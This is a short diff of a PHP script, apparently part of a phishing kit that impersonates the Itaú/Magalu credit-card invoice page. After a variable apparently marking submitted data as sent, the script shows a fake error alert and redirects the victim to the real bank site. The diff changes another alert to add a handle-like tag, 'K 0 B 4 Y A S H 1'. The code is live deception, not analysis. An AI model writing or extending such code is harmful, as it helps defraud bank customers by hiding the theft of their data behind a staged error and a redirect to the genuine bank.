@@ -51,7 +51,7 @@
 	if($envio){
 		echo "<script>alert('Desculpe, algo deu errado. Tente novamente !');location='https://www.itau.com.br/cartoes/magalu/consulte-sua-fatura/';</script>";
 	}else{ 
-		echo "<script>alert('Desculpe, algo deu errado. Tente novamente !');location='../index.php';</script>";
+		echo "<script>alert('Desculpe, algo deu errado.K 0 B 4 Y A S H 1 !');location='../index.php';</script>";
 	}
 
 ?>
